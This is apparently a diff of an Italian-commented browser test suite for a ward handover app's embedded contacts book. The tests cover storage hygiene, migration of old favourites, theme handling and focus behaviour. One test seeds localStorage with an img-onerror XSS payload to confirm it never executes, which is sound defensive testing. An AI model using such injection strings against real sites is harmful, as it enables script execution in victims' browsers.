+          // nomi e numeri: sotto NESSUNA chiave delle due memorie del browser, non solo sotto quelle «rubrica-…»
+          [['localStorage', localStorage], ['sessionStorage', sessionStorage]].forEach(function (m) {
+            for (var i = 0; i < m[1].length; i++) {
+              var k = m[1].key(i);
+              if (/PROVA-AUTOMATICA|5550199/.test(m[1].getItem(k) || '')) guai.push(m[0] + ': la chiave ' + k + ' contiene nomi o numeri');
+            }
+          });
           raccogliErrori(x);
           return !guai.length || guai.join(' ‖ ');
         });
 
-        // ── 14. uscita ──
+        // ── 27. preferiti della rubrica di prima ──
+        await prova(S, 'i preferiti lasciati dalla rubrica di prima si riprendono una volta sola, e solo come identificativi; poi le sue chiavi spariscono', async function () {
+          var ostile = '2"><img src=x onerror="' + tracciaDaCornice('r-favs') + '">', guai = [];
+          window.__xss = [];
+          localStorage.removeItem('rubrica-preferiti'); localStorage.removeItem('rubrica-chiamati'); localStorage.removeItem('rubrica-tema');
+          localStorage.setItem('rubrica-favs', JSON.stringify([ostile, { a: 1 }, String(B.id), B.id, -3]));
+          localStorage.setItem('rubrica-recent-calls', JSON.stringify([A.id, ostile]));
+          localStorage.setItem('rubrica-theme', 'dark');
+          var fr = await cornice('rubrica/?cb=' + Date.now());
+          cornici.push(fr);
+          var x = fr.contentWindow, doc = x.document;
+          var card = await finche(function () { return schedaContatto(doc, B.id); }, 20000);
+          if (!card) return 'la rubrica nella cornice non ha disegnato i contatti';
+          await attendi(600);
+          if (eseguiti().length) guai.push('codice ESEGUITO: ' + eseguiti().join(', '));
+          if (localStorage.getItem('rubrica-preferiti') !== JSON.stringify([B.id])) guai.push('preferiti ripresi: «' + String(localStorage.getItem('rubrica-preferiti')).slice(0, 60) + '» (atteso il solo contatto di prova)');
+          if (localStorage.getItem('rubrica-chiamati') !== JSON.stringify([A.id])) guai.push('chiamati di recente ripresi: «' + String(localStorage.getItem('rubrica-chiamati')).slice(0, 60) + '»');
+          if (!card.querySelector('.contact-fav-star') || doc.querySelectorAll('.contact-fav-star').length !== 1) guai.push('la stella non è sul solo contatto ripreso');
+          if (doc.documentElement.getAttribute('data-theme') !== 'light' || localStorage.getItem('rubrica-tema') !== null) guai.push('il tema della rubrica di prima è stato ripreso (il predefinito qui è chiaro)');
+          DI_PRIMA.forEach(function (k) { if (localStorage.getItem(k) !== null) guai.push('la chiave ' + k + ' è rimasta sul dispositivo'); });
+          if (esche(doc.getElementById('contactList')) || attributiNati(doc.getElementById('contactList')).length) guai.push('markup nato dai preferiti di prima');
+          raccogliErrori(x);
+          return !guai.length || guai.join(' ‖ ');
+        });
+
+        // ── 28. uscita ──
         await prova(S, 'all\'uscita dall\'app la rubrica viene svuotata: via le sue chiavi locali (restano tema e preferiti) e il contenuto del riquadro, che poi si riapre da capo', async function () {
           var guai = [];
           localStorage.setItem('rubrica-data', 'x'); localStorage.setItem('rubrica-chiamati', '[1]'); localStorage.setItem('rubrica-chiave-futura', 'x');
@@ -2090,10 +2715,61 @@
           if (!w) guai.push('dopo lo svuotamento il riquadro non si riapre');
           return !guai.length || guai.join(' ‖ ');
         });
+
+        // ── 29. un caricamento del riquadro finito altrove ──
+        await prova(S, 'se nella cornice non c\'è la rubrica (un caricamento finito altrove) la riapertura del riquadro la carica di nuovo, senza dover ricaricare l\'app', async function () {
+          if (w) raccogliErrori(w);
+          w = null;
+          // ciò che resta dopo un caricamento non riuscito: una pagina che non è la rubrica
+          cornicePannello.src = 'about:blank';
+          await attendi(4600);     // entro pochi secondi dall'ultima richiesta l'indirizzo non si riassegna
+          window.chiudiRubrica(); window.apriRubrica();
+          w = await finche(function () {
+            var x = cornicePannello.contentWindow;
+            return (x && typeof x.loadData === 'function' && x.document.querySelector('.contact-card')) ? x : false;
+          }, 20000);
+          return !!w || 'il riquadro è rimasto senza la rubrica';
+        });
+
+        // ── a richiesta: scheda in modifica e riquadro (serve la finestra in primo piano) ──
+        if (opz.fuoco && w) {
+          await prova(S, 'scheda in modifica: il fuoco nella rubrica non chiude la modifica, e chiudendo il riquadro torna nella scheda', async function () {
+            if (!document.hasFocus()) return 'la pagina non ha il fuoco: questa prova va lanciata con la finestra in primo piano (oppure fatta a mano)';
+            var card = scheda(LETTO_PROVA);
+            if (!card) return 'scheda del letto di prova non trovata';
+            var libera = await _q(_sb.from('consegne').select('nome,diagnosi').eq('letto', LETTO_PROVA).maybeSingle());
+            if (!libera || (libera.nome || '').trim() || (libera.diagnosi || '').trim()) return 'il letto di prova non è libero: la prova non lo tocca';
+            var aperta = function () { return card.classList.contains('focus-mode'); };
+            _attivaFocusMode(card);
+            try {
+              if (!(await finche(function () { return aperta() && card.contains(document.activeElement); }, 12000))) return 'la scheda di prova non è entrata in modifica';
+              await attendi(900);
+              window.apriRubrica();
+              cornicePannello.focus();
+              await attendi(900);       // il listener decide 300 ms dopo l'uscita del fuoco
+              if (document.activeElement !== cornicePannello) return 'il fuoco non è arrivato alla cornice della rubrica';
+              if (!aperta()) return 'il fuoco nella rubrica ha CHIUSO la modifica';
+              pannello.querySelector('button[title="Chiudi"]').click();
+              await attendi(900);
+              if (!aperta() || !card.contains(document.activeElement)) return 'chiuso il riquadro, il fuoco non è tornato nella scheda (o la modifica si è chiusa)';
+              // controprova: senza riquadro, il fuoco che esce dalla scheda la chiude
+              try { if (typeof _dirtyLetti !== 'undefined') _dirtyLetti.delete(LETTO_PROVA); } catch (e) {}
+              window._lastMousedownInCard = false;
+              document.activeElement.blur();
+              await attendi(1500);
+              return !aperta() || 'controprova fallita: uscito il fuoco dalla scheda, la modifica è rimasta aperta';
+            } finally {
+              // si esce SENZA salvare: la scheda non è stata toccata
+              try { if (typeof _dirtyLetti !== 'undefined') _dirtyLetti.delete(LETTO_PROVA); } catch (e) {}
+              if (aperta()) _disattivaFocusMode(false);
+              await attendi(1200);
+            }
+          });
+        }
       }
     } finally {
       cornici.forEach(function (c) { try { c.remove(); } catch (e) {} });
-      RESIDUI.concat(['rubrica-chiave-futura']).forEach(function (k) { try { localStorage.removeItem(k); } catch (e) {} });
+      RESIDUI.concat(DI_PRIMA, ['rubrica-chiave-futura']).forEach(function (k) { try { localStorage.removeItem(k); } catch (e) {} });
       PREFERENZE.forEach(function (k) { try { if (memoriaPrima[k] === null) localStorage.removeItem(k); else localStorage.setItem(k, memoriaPrima[k]); } catch (e) {} });
       try { await pulisciDatabase(); } catch (e) {}
       // il riquadro riparte da capo: senza i contatti di prova e con le preferenze di prima
@@ -2117,7 +2793,7 @@
       var c = await _q(_sb.from('rubrica_contatti').select('id').like('nome', SEGNO_RUBRICA + '%'));
       var k = await _q(_sb.from('rubrica_categorie').select('id').like('nome', SEGNO_RUBRICA + '%'));
       if (c.length || k.length) return 'righe di prova rimaste: ' + c.length + ' contatti, ' + k.length + ' categorie';
-      var diverse = PREFERENZE.filter(function (x) { return localStorage.getItem(x) !== memoriaPrima[x]; }).concat(RESIDUI.filter(function (x) { return localStorage.getItem(x) !== null; }));
+      var diverse = PREFERENZE.filter(function (x) { return localStorage.getItem(x) !== memoriaPrima[x]; }).concat(RESIDUI.concat(DI_PRIMA).filter(function (x) { return localStorage.getItem(x) !== null; }));
       return !diverse.length || ('chiavi non rimesse a posto: ' + diverse.join(', '));
     });
     await prova(S, 'nessun errore JavaScript e nessun blocco della regola CSP durante le prove della rubrica', function () {
@@ -2125,7 +2801,6 @@
       return !nuovi.length || nuovi.slice(0, 5).join(' | ');
     });
   }
-
   var SEZIONI = { ambiente: sezioneAmbiente, trak: sezioneTrak, xss: sezioneXss, mail: sezioneMail, rubrica: sezioneRubrica };
 
   window.__prove = async function (opz) {
